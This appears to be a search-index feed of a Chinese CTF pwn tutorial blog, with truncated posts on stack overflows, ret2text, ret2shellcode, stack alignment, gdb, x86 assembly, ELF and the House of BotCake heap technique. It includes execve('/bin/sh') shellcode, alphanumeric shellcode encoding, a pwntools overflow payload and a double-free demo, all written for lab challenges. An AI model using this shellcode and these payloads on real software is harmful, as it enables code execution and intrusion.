1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 $ chmod +x ./rop (.venv) master ✱ ◼ &amp;#39;./rop&amp;#39; 的模式已由 0644 (rw-r--r--) 更改为 0755 (rwxr-xr-x) $ pwn checksec ./rop (.venv) master ✱ ◼ [*] &amp;#39;/home/lhon901/Pwn/ctf-challenges/pwn/linux/user-mode/stackoverflow/ret2syscall/bamboofox-ret2syscall/rop&amp;#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) Stripped: No Debuginfo: Yes $ file ./rop (.venv) master ✱ ◼ ./rop: ELF 32-bit LSB executable, Intel i386, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.24, BuildID[sha1]=2bff0285c2706a147e7b150493950de98f182b78, with debug_info, not stripped 32 位程序，启用了 NX, 静态链接
静态分析:
1 2 3 4 5 6 7 8 9 10 11 12 13 int __cdecl main(int argc, const char **argv, const char **envp) { int v4; // …  ]]></content></entry><entry><title>从零开始的 Pwn 之旅 - Ret2shellcode 进阶</title><url>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---ret2shellcode-%E8%BF%9B%E9%98%B6/</url><categories><category>Ctf</category></categories><tags><tag>Ctf</tag><tag>Pwn</tag></tags><content type="html"><![CDATA[  手写 shellcode 这里给出最经典的 shellcode
1 2 3 4 5 6 7 8 9 10 11 xor eax, eax ; eax = 0 push eax ; push 0 (null terminator) push 0x68732f2f ; push &#34;//sh&#34; push 0x6e69622f ; push &#34;/bin&#34; mov ebx, esp ; ebx = pointer to &#34;/bin//sh&#34; push eax ; push 0 (argv[1] = NULL) mov edx, esp ; edx = pointer to NULL push ebx ; push pointer to &#34;/bin//sh&#34; mov ecx, esp ; ecx = pointer to argv mov al, 0xb ; syscall number for execve int 0x80 ; trigger syscall 最经典的 Linux x86（32位）shellcode，它的作用是执行 /bin/sh（获得 shell）
为什么要使用 eax 来 push \x00? 如果我们使用以下这种形式
1 2 push 0x68732f00 ; push &#34;/sh\x00&#34; push 0x6e69622f ; push &#34;/bin&#34; 在小端序中:
1 2 3 4 5 +----------------------------+ | 2f 62 69 6e | (&#34;/bin&#34;) | ← esp 指向这里 | 00 2f 73 68 | (&#34;\x00/sh&#34;) | | 00 00 00 00 | (终止符) | +----------------------------+ 可以很明显的观察到字符串被截断了
shellcode 执行：
al = 0xb (execve syscall) ebx = &ldquo;/bin/sh&rdquo; 的地址 ecx = argv 的地址（argv[1] = NULL 或者指向一个数组） edx = envp 的地址（envp = NULL 或者指向一个数组） 手写 shellcode, 需要关注寄存器的内容
eax 一般用来存储函数的返回值, read 函数我们可以控制读入的字符数量来控制 eax 的值 清空寄存器使用 xor 而不是 mov 用 push/pop 代替 mov, pop ebx 比 mov ebx, xxx 更短 明文 shellcode 有些题目限制我们输入的字符串不能是不可见字符，这时候明文 shellcode 就派上用场了。
ae64 ae64 1 2 3 git clone https://github.com/veritas501/ae64.git --depth 1 cd ae64 python setup.py install 用法示例：
1 2 3 4 5 6 7 8 9 10 from ae64 import AE64 from pwn import * context.arch=&#39;amd64&#39; # get bytes format shellcode shellcode = asm(shellcraft.sh()) # get alphanumeric shellcode enc_shellcode = AE64().encode(shellcode) print(enc_shellcode.decode(&#39;latin-1&#39;)) 默认参数：
1 2 3 4 5 6 7 8 9 10 11 12 13 enc_shellcode = AE64().encode(shellcode) # equal to enc_shellcode = AE64().encode(shellcode, &#39;rax&#39;, 0, &#39;fast&#39;) def encode(self, shellcode: bytes, register: str = &#39;rax&#39;, offset: int = 0, strategy: str = &#39;fast&#39;) -&gt; bytes: &#34;&#34;&#34; encode given shellcode into alphanumeric shellcode (amd64 only) @param shellcode: bytes format shellcode @param register: the register contains shellcode pointer (can with offset) (default=rax) @param offset: the offset (default=0) @param strategy: encode strategy, can be &#34;fast&#34; or &#34;small&#34; (default=fast) @return: encoded shellcode &#34;&#34;&#34; alpha3 alpha3 1 git clone https://github.com/TaQini/alpha3.git 用法示例：
1 2 3 4 from pwn import * context.arch=&#39;amd64&#39; sc = shellcraft.sh() print asm(sc) 1 2 3 4 5 python sc.py &gt; ~/Pwn/alpha3/shellcode # 下面两种选择一种 python ./ALPHA3.py x64 ascii mixedcase rax --input=&#34;shellcode&#34; ./shellcode_x64.sh rax 这里用于编码的寄存器 call $register 就使用 $register 进行编码
手写明文 shellcode 手把手教你写纯字符ascii shellcode——最通俗易懂的alphanumeric shellcode生成指南   ]]></content></entry><entry><title>从零开始的 Pwn 之旅 - Ret2shellcode</title><url>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---ret2shellcode/</url><categories><category>Ctf</category></categories><tags><tag>Ctf</tag><tag>Pwn</tag></tags><content type="html">  前言 ret2shellcode 即是将程序的控制流劫持到我们构造的 shellcode 上。shellcode 是一段可以被执行的代码，通常用于执行系统命令或打开一个 shell。
想要执行 sehllcode, shellcode 所在的内存区域必须是可执行的。
使用 pwn checksec 命令检查二进制文件的安全特性，若发现 NX 被启用，则说明该二进制文件的堆栈内存区域不可执行。此方法一般而言来说会失效。
需要注意的是，在新版内核当中引入了较为激进的保护策略，程序中通常不再默认有同时具有可写与可执行的段，这使得传统的 ret2shellcode 手法不再能直接完成利用。 应当在内核版本较老的环境中进行实验（如 Ubuntu 18.04 或更老版本）。由于容器环境间共享同一内核，因此这里我们无法通过 docker 完成环境搭建。
ret2shellcode-example ret2shellcode 先进行安全防护检测
1 2 3 4 5 6 7 8 9 10 11 12 13 $ chmod +x ./ret2shellcode $ pwn checksec ./ret2shellcode [!] Could not populate PLT: future feature annotations is not defined (unicorn.py, line 5) [*] &amp;amp;#39;/home/lhon901/work/ctf-challenges/pwn/linux/user-mode/stackoverflow/ret2shellcode/ret2shellcode-example/ret2shellcode&amp;amp;#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX unknown - GNU_STACK missing PIE: No PIE (0x8048000) Stack: Executable RWX: Has RWX segments Stripped: No Debuginfo: Yes 32 位程序没有任何的保护
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 …  </content></entry><entry><title>从零开始的 Pwn 之旅 - Ret2text</title><url>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---ret2text/</url><categories><category>Ctf</category></categories><tags><tag>Ctf</tag><tag>Pwn</tag></tags><content type="html"><![CDATA[  前言 之前我们已经初步介绍了栈溢出和栈对齐，这一节我们将做一个巩固练习
ret2text ret2text 先进行安全防护检测
1 2 3 4 5 6 7 8 9 10 11 ~/P/c/p/l/u/s/r/bamboofox-ret2text ❯❯❯ chmod +x ./ret2text (.venv) master &amp;#39;./ret2text&amp;#39; 的模式已由 0644 (rw-r--r--) 更改为 0755 (rwxr-xr-x) ~/P/c/p/l/u/s/r/bamboofox-ret2text ❯❯❯ pwn checksec ./ret2text (.venv) master ✱ [*] &amp;#39;/home/lhon901/Pwn/ctf-challenges/pwn/linux/user-mode/stackoverflow/ret2text/bamboofox-ret2text/ret2text&amp;#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) Stripped: No Debuginfo: Yes ida pro 逆向
1 2 3 4 5 6 7 8 9 10 11 int __cdecl main(int argc, const char **argv, const char **envp) { char s[100]; // [esp+1Ch] [ebp-64h] BYREF setvbuf(stdout, 0, 2, 0); setvbuf(_bss_start, 0, 1, 0); puts(&amp;#34;There is something amazing here, do you know anything?&amp;#34;); gets(s); printf(&amp;#34;Maybe I will tell you next time !&amp;#34;); return 0; } 发现危险函数 gets, 可以进行栈溢出
1 2 3 4 5 6 7 8 9 10 11 12 13 void secure() { time_t v0; // eax int input; …  ]]></content></entry><entry><title>从零开始的 Pwn 之旅 - 栈对齐</title><url>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---%E6%A0%88%E5%AF%B9%E9%BD%90/</url><categories><category>Ctf</category></categories><tags><tag>Pwn</tag><tag>Ctf</tag></tags><content type="html"><![CDATA[  前言 在上一节中为了成功执行 payload，我们在 exp.py 中加入了 ret 指令，今天我们将继续深入了解栈对齐的问题。
栈对齐 1 2 3 4 5 6 7 8 9 10 11 12 from pwn import * p = process(&amp;#34;./main&amp;#34;) # 启动程序 backdoor = 0x401170 # backdoor 函数的地址 # 0x000000000040101a : ret ret = 0x40101a payload = b&amp;#34;a&amp;#34; * (0x10 + 0x8) + p64(backdoor) # 填充到 0x10 字节 + 8 字节的返回地址 p.sendline(payload) # 发送 payload p.interactive() # 进入交互模式 开始调试后一直跟踪到发现卡住无法调试了
1 2 3 4 5 6 7 8 9 10 11 12 13 14 ─────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────── ► 0x7f740018ffb5 movaps xmmword ptr [rsp], xmm1 &amp;lt;[0x7fffa6e14238] not aligned to 16 bytes&amp;gt; 0x7f740018ffb9 lock cmpxchg dword ptr [rip + 0x1955bf], edx 0x7f740018ffc1 jne 0x7f74001902c0 &amp;lt;0x7f74001902c0&amp;gt; 0x7f740018ffc7 mov eax, dword ptr [rip + 0x1955b7] EAX, [0x7f7400325584] =&amp;gt; 0 0x7f740018ffcd lea edx, [rax + 1] EDX =&amp;gt; 1 0x7f740018ffd0 mov dword ptr [rip + 0x1955ae], edx [0x7f7400325584] &amp;lt;= 1 0x7f740018ffd6 test eax, eax 0 &amp;amp; 0 EFLAGS =&amp;gt; 0x10246 [ cf PF af ZF …  ]]></content></entry><entry><title>从零开始的 Pwn 之旅 - 栈溢出初识</title><url>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%9D%E8%AF%86/</url><categories><category>Ctf</category></categories><tags><tag>Pwn</tag><tag>Ctf</tag></tags><content type="html">  前言 为什么输入一串杂乱的字符串，就能让程序崩溃？为什么输入一串特定的字符串，就能让程序执行任意代码？下面的内容将带你走进 Pwn 的世界，了解栈溢出是如何发生的，以及如何利用它来执行任意代码。
栈 (stack) 栈 (stack) 是一种数据结构，计算机中使用栈来存储函数调用的局部变量、返回地址等信息。
1 2 3 4 5 6 7 8 9 10 11 +---------------------+ | 0x804000 | &amp;amp;lt;- 栈顶 (sp 指针) +---------------------+ | ... | +---------------------+ | 0x803000 | +---------------------+ | ... | +---------------------+ | 0x802000 | &amp;amp;lt;- 栈底 (ebp 指针) +---------------------+ stack 是一个后进先出 (LIFO) 的数据结构，最后压入栈的元素最先被弹出。 如示意图所示数据是这样入栈的
1 2 3 4 5 push 0x802000 ... push 0x803000 ... push 0x804000 当被弹出如下所示
1 2 3 pop rax ; rax = 0x804000 pop rbx ; rbx = 0x804000 - 0x??? ... stack 在操作系统中是从高地址向低地址增长的。 这意味着栈顶的地址比栈底的地址大。 操作系统内存布局示意图:
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 +-------------------------------+ | 内核空间 (Kernel) | |-------------------------------| | 内核模块/驱动 | |-------------------------------| | 内核栈/内核数据 | +-------------------------------+ | 用户空间 (User) | |-------------------------------| | 堆 (Heap) | |-------------------------------| | 未分配空 …  </content></entry><entry><title>从零开始的 Pwn 之旅 - Pwn 环境的搭建</title><url>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---pwn-%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/</url><categories><category>Ctf</category></categories><tags><tag>Pwn</tag><tag>Ctf</tag></tags><content type="html"><![CDATA[  静态代码分析 ida pro [Disassemblers] IDA Pro 9.0 RC1 全平台安装包 及 patch脚本 安装过程不再赘述
将要分析的二进制文件拖入 IDA Pro 中，等待分析完成。
按下 F5 可以展示当前函数 C 伪代码 Shift + F12 可以展示当前程序的字符串 在反汇编窗口按下空格可切换视图 静态代码分析 gdb 前面的文章中已经介绍了如何使用 GDB 进行调试，这里不再赘述。
从零开始的 Pwn 之旅 - 掌握调试器 gdb 的基本使用 Pwn 相关工具 pwntools 1 pip install pwntools checksec 当安装了 pwntools 之后，可以使用 checksec 命令来检查二进制文件的安全特性。
1 2 3 4 5 6 7 8 $ pwn checksec main [*] &#39;/home/lhon901/Code/cpp/main&#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) Stripped: No ROPGadget 当安装了 pwntools 之后，可以使用 ROPGadget 命令来查找 ROP gadget。
1 2 3 4 5 6 7 8 $ ROPgadget --binary ./main --only &#34;pop|ret&#34; Gadgets information ============================================================ 0x000000000040111d : pop rbp ; ret 0x000000000040101a : ret 0x0000000000401042 : ret 0x2f Unique gadgets found: 3 LibcSearcher LibcSearcher   ]]></content></entry><entry><title>从零开始的 Pwn 之旅 - 掌握调试器 gdb 的基本使用</title><url>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---%E6%8E%8C%E6%8F%A1%E8%B0%83%E8%AF%95%E5%99%A8-gdb-%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/</url><categories><category>Ctf</category></categories><tags><tag>Pwn</tag><tag>Ctf</tag></tags><content type="html"><![CDATA[  GDB 介绍 gdb 是 GNU Debugger 的缩写，是一个强大的调试工具，广泛用于调试 C/C++ 程序。它允许开发者在程序运行时检查变量、设置断点、单步执行代码等操作。掌握 gdb 是进行 Pwn 挑战的基础技能之一。
安装 gdb archlinux: sudo pacman -S gdb macOS: brew install gdb ubuntu: sudo apt install gdb gdb 基础命令 命令（缩写） 说明 break &amp;lt;位置&amp;gt;/b 在指定位置设置断点 run/r 启动程序（可带参数） next/n 执行下一行，不进入函数 step/s 执行下一行，若为函数则进入 finish 执行到当前函数结束并返回 continue/c 继续执行程序，直到下一个断点 set args &amp;lt;参数&amp;gt; 设置程序运行时的命令行参数 info breakpoints /i b 查看所有断点信息 delete &amp;lt;编号&amp;gt; 删除指定编号的断点 print &amp;lt;表达式&amp;gt;/p 打印变量或表达式的值 x/&amp;lt;格式&amp;gt; &amp;lt;地址&amp;gt; 查看内存内容，如 x/4x 以十六进制格式查看 4 个字节 bt 打印当前调用栈（backtrace） info registers/ i r 查看所有寄存器的值 disassemble/disas 反汇编当前函数或指定地址段 quit/q 退出 gdb x 指令常用用法 用法 说明 x/4x &amp;lt;addr&amp;gt; 以十六进制格式查看 4 个字（4*4=16 字节） x/8d &amp;lt;addr&amp;gt; 以十进制格式查看 8 个字 x/16b &amp;lt;addr&amp;gt; 以字节（byte）为单位查看 16 个字节 x/4i &amp;lt;addr&amp;gt; 以汇编指令格式查看 4 条指令 x/s &amp;lt;addr&amp;gt; 以字符串格式查看内存内容 x/wx &amp;lt;addr&amp;gt; 以 word（4 字节）为单位十六进制显示 x/gx &amp;lt;addr&amp;gt; 以 giant word（8 字节）为单位十六进制显示 x/a &amp;lt;addr&amp;gt; 以地址格式显示指针内容 说明：
&amp;lt;addr&amp;gt; 可以是变量名、寄存器（如 $esp）、或具体地址（如 0x8048000） 常用 …  ]]></content></entry><entry><title>从零开始的 Pwn 之旅 - x86 汇编基础</title><url>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---x86-%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80/</url><categories><category>Ctf</category></categories><tags><tag>Pwn</tag><tag>Ctf</tag></tags><content type="html">  汇编语言风格 AT&amp;amp;amp;T Intel 寄存器前缀 % 寄存器无前缀 立即数前缀 $ 立即数无前缀 16 进制数前缀 0x 16 进制数后缀 h 源操作数在前，目标操作数在后 源操作数在后，目标操作数在前 间接寻址使用 (%reg) 间接寻址使用 [reg] 间接寻址格式为 (%reg, %reg, scale) 间接寻址格式为 [reg + reg * scale] 操作数大小后缀 b、w、l 操作数大小后缀 byte ptr、word ptr、dword ptr 寄存器 寄存器是 CPU 内部的高速存储器，用于存储临时数据和指令执行状态。
如下图所示，以 r 开头的寄存器为 64 位寄存器，e 开头的寄存器为 32 位寄存器，ax、bx 等为 16 位寄存器。 在 64 位模式下，寄存器的高 32 位可以通过 e 前缀访问，例如 eax 是 rax 的低 32 位。 同样，寄存器的低 16 位可以通过 x 后缀访问，例如 ax 是 eax 的低 16 位。
特殊寄存器 段寄存器：用于存储内存段的基地址，常用的段寄存器有 cs（代码段）、ds（数据段）、ss（堆栈段）、es、fs、gs。
标志寄存器：用于存储 CPU 的状态信息，包括零标志位、符号标志位、进位标志位等。
指令指针寄存器：eip（32 位模式）或 rip（64 位模式），用于存储下一条要执行的指令的地址。
堆栈指针寄存器：esp（32 位模式）或 rsp（64 位模式），用于指向当前堆栈的顶部。
基址寄存器：ebp（32 位模式）或 rbp（64 位模式），用于指向当前函数的堆栈帧基址。
常见指令 MOV：数据传送指令，用于将数据从一个位置移动到另一个位置。 ![NOTE] BYTE、WORD 和 DWORD 分别表示 1 字节、2 字节和 4 字节的数据类型。
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 mov eax, ebx ; 将 ebx 的值复制到 eax mov [eax], ebx ; 将 ebx 的值存储到 eax 指向的内存地址 mov eax, 0x1234 ; 将立即数 0x1234 传送到 eax mov eax, [ebx + 4] ; 将 ebx 指向的内存地址加 4 后的值加载到 eax …  </content></entry><entry><title>从零开始的 Pwn 之旅 - 深入了解 elf 文件</title><url>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3-elf-%E6%96%87%E4%BB%B6/</url><categories><category>Ctf</category></categories><tags><tag>Pwn</tag><tag>Ctf</tag></tags><content type="html">  ELF 文件初识 ELF 文件即 Linux 下的可执行文件，ELF 是 Executable and Linkable Format 的缩写。它是一个标准的二进制文件格式，用于存储可执行文件、目标代码、共享库和核心转储等。
使用 Linux 内置命令 file 可以轻松查看文件类型：
1 2 3 4 5 $ file /bin/ls /bin/ls: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=d1f6561268de19201ceee260d3a4f6662e1e70dd, for GNU/Linux 4.4.0, stripped ELF 64-bit LSB pie executable 部分表示这是一个 64 位的 ELF 文件，LSB 表示低位字节序，pie 表示位置无关可执行文件（Position Independent Executable）。 x86-64 表示这是一个 amd64(x86-64) 架构的可执行文件。 dynamically linked 表示这个可执行文件是动态链接的，意味着它依赖于共享库。 interpreter /lib64/ld-linux-x86-64.so.2 表示这个可执行文件使用的动态链接器是 /lib64/ld-linux-x86-64.so.2。 BuildID[sha1]=d1f6561268de19201ceee260d3a4f6662e1e70dd 是一个唯一的标识符，用于标识这个可执行文件的构建版本。 for GNU/Linux 4.4.0 表示这个可执行文件是为 GNU/Linux 4.4.0 版本构建的。 stripped 表示这个可执行文件已经被剥离了调试信息。 当 ELF 文件被赋予可执行属性时，直接在命令行中输入 ELF 文件路径即可执行该文件：
1 2 3 4 5 6 7 8 9 10 # 可执行文件在当期目录下 $ ./binary_file # 可执行文件在其他目录下(使用绝对路径) $ /bin/binary_file # 可执行文件在其他目录下(使用相对路径) $ …  </content></entry><entry><title>House_of_BotCake</title><url>/posts/house_of_botcake/</url><categories><category>Ctf</category></categories><tags><tag>Pwn</tag><tag>Ctf</tag></tags><content type="html"><![CDATA[  利用背景 自 glibc 2.29 开始加入了对 tcache 的 double free 检查, 使得之前的 tcache double free 失效
源码解读 tcache 结构体
1 2 3 4 5 6 typedef struct tcache_entry { struct tcache_entry *next; //链表指针，对应chunk中的fd字段 /* This field exists to detect double frees. */ struct tcache_perthread_struct *key; //指向所属的tcache结构体，对应chunk中的bk字段 } tcache_entry; tcache 被置入链表
1 2 3 4 5 6 7 8 9 10 11 12 13 14 static __always_inline void tcache_put(mchunkptr chunk, size_t tc_idx) { tcache_entry *e = (tcache_entry *)chunk2mem(chunk); /* Mark this chunk as &#34;in the tcache&#34; so the test in _int_free will detect a double free. */ e-&gt;key = tcache; //设置所属的tcache e-&gt;next = tcache-&gt;entries[tc_idx];//单链表头插法 tcache-&gt;entries[tc_idx] = e; ++(tcache-&gt;counts[tc_idx]); //计数增加 } tcache double free 检查
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 size_t tc_idx = csize2tidx(size); // 只要tcache不为空，并且这个chunk属于tcache管辖范围，那么这个chunk就有可能已经在tcache中了，所以需要double free检查 if (tcache != NULL &amp;&amp; tc_idx &lt; mp_.tcache_bins) { /* Check to see if it&#39;s already in the tcache. */ tcache_entry *e = (tcache_entry *)chunk2mem(p); /* 如果是double free，那么put时key字段被设置了tcache，就会进入循环被检查出来 如果不是，那么key字段就是用户数据区域，可以视为随机的，只有1/(2^size_t)的可能行进入循环，然后循环发现并不是double free */ if (__glibc_unlikely(e-&gt;key == tcache))//剪枝 { tcache_entry *tmp; LIBC_PROBE(memory_tcache_double_free, 2, e, tc_idx); for (tmp = tcache-&gt;entries[tc_idx]; tmp; tmp = tmp-&gt;next) if (tmp == e) malloc_printerr(&#34;free(): double free detected in tcache 2&#34;); } if (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count) //通过检查，放入tcahce中 { tcache_put(p, tc_idx); return; } } 动态调试 可以清晰的看到 bk 字段即 key 指向当前线程的 tcache chunk 区域
利用手法 利用思路 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 // detail: https://github.com/shellphish/how2heap/blob/master/glibc_2.35/house_of_botcake.c #include &lt;stdlib.h&gt; #include &lt;stdint.h&gt; int main() { // malloc chunks intptr_t *x[7]; for(int i=0; i&lt;sizeof(x)/sizeof(intptr_t*); i++){ x[i] = malloc(0x100); } intptr_t *prev = malloc(0x100); intptr_t *victim = malloc(0x100); malloc(0x10); // free to fill tcache bins for(int i=0; i&lt;7; i++){ free(x[i]); } free(victim); free(prev); // Now, victim and prev already merge malloc(0x100); // double free free(victim); return 0; } 利用详解 上述代码内存布局:
1 2 // line 20 free(victim); 1 2 // line 21 free(prev); 此时 prev chunk 和 victim chunk 已经合并
1 2 // line 23 malloc(0x100); 此时申请内存块首先会从 tcache bins 返回内存块
1 2 // line 25 free(victim); victim chunk 已经被链接进了 tcache bins
只要 malloc 到 prev chunk 这块内存，就可以进行 tcache poisoning attack
漏洞成因 此漏洞的造成是因为 tcache 的检查不严谨导致的, free 函数通过检测当前 chunk 大小是否在 tcache 范围内来判断 double free
1 2 3 4 5 6 7 8 if (__glibc_unlikely(e-&gt;key == tcache))//剪枝 { tcache_entry *tmp; LIBC_PROBE(memory_tcache_double_free, 2, e, tc_idx); for (tmp = tcache-&gt;entries[tc_idx]; tmp; tmp = tmp-&gt;next) if (tmp == e) malloc_printerr(&#34;free(): double free detected in tcache 2&#34;); } 没有考虑到 unsorted bins chunk 被置入 tcache 没有 key 的情况
利用示例 write here   ]]></content></entry><entry><title>Hello_world</title><url>/posts/hello_world/</url><categories><category>test</category></categories><tags><tag>test</tag></tags><content type="html">  md test~ 🤔
  </content></entry></search>